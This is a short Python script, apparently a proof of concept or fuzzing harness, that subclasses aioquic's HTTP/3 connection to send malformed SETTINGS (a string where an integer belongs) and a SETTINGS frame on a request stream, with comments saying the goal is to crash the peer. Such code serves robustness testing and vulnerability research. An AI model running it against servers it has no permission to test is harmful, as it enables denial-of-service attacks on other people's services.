import aioquic
from aioquic.h3.connection import (
    H3Connection, 
    HeadersState, 
    FrameUnexpected, 
    encode_frame, 
    FrameType, 
    encode_settings,
    Setting
)
from aioquic.h3.events import Headers


class H3ConnectionChild(H3Connection):

    def _get_local_settings(self) -> dict:
        """
        Return the local HTTP/3 settings.
        """
        settings = {
            Setting.QPACK_MAX_TABLE_CAPACITY: self._max_table_capacity,
            Setting.QPACK_BLOCKED_STREAMS: self._blocked_streams,
            Setting.ENABLE_CONNECT_PROTOCOL: 1,
            Setting.DUMMY: 1,
            Setting.MAX_FIELD_SECTION_SIZE: "Let me create a Crash please"
        }
        if self._enable_webtransport:
            settings[Setting.H3_DATAGRAM] = 1
            settings[Setting.ENABLE_WEBTRANSPORT] = 1
        return settings

# Sending SETTINGS Frame on Request Stream to create a crash
def send_headers(
    conn: H3Connection, stream_id: int, headers: Headers, end_stream: bool = False
) -> None:
    """
    Send headers on the given stream.

        To retrieve datagram which need to be sent over the network call the QUIC
        connection's :meth:`~aioquic.connection.QuicConnection.datagrams_to_send`
        method.

        :param stream_id: The stream ID on which to send the headers.
        :param headers: The HTTP headers to send.
        :param end_stream: Whether to end the stream.
    """
        # check HEADERS frame is allowed
    stream = conn._get_or_create_stream(stream_id)
    if stream.headers_send_state == HeadersState.AFTER_TRAILERS:
        raise FrameUnexpected("HEADERS frame is not allowed in this state")

    frame_data = conn._encode_headers(stream_id, headers)

    # log frame
    if conn._quic_logger is not None:
        conn._quic_logger.log_event(
            category="http",
            event="frame_created",
            data=conn._quic_logger.encode_http3_headers_frame(
                length=len(frame_data), headers=headers, stream_id=stream_id
            ),
        )

    # update state
    if stream.headers_send_state == HeadersState.INITIAL:
        stream.headers_send_state = HeadersState.AFTER_HEADERS
    else:
        stream.headers_send_state = HeadersState.AFTER_TRAILERS

    # Sending SETTINGS Frame on Request Stream to create a crash:
    conn._sent_settings = conn._get_local_settings()
    conn._quic.send_stream_data(
        stream_id,
        encode_frame(FrameType.SETTINGS, encode_settings(conn._sent_settings)),
    )

    # Send headers
    conn._quic.send_stream_data(
        stream_id, encode_frame(FrameType.HEADERS, frame_data), end_stream
    )

